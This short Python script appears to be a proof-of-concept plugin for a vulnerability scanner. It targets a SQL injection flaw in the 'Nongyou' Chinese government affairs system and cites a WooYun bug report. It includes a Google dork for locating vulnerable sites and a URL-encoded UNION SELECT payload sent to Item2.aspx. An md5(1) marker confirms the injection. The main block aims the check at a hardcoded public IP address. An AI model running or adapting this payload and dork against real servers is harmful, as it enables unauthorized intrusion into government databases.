#!/usr/bin/evn python
#-*-:coding:utf-8 -*-


#Author:wonderkun
#Name: 农友政务系统另一处  sql注入


#Refer:http://wooyun.org/bugs/wooyun-2010-0120498
#Data:2016/1/30
#google dork:inurl:DynamicItemViewOut.aspx



def  assign(service,arg):
    if service=="nongyou":
        return True,arg

def audit(arg):
    vun_url=arg+"newsymItemView/Item2.aspx?id=021973"
    payload="%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2Cconcat%28md5%281%29%29%2CNULL%2CNULL%23"
    code,head,res,errcode,finalurl=curl.curl2(vun_url+payload)
    if code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole('sql inject:'+vun_url)

if __name__=='__main__':
    from dummy import *
    audit(assign('nongyou','http://60.214.157.46:8049/')[1])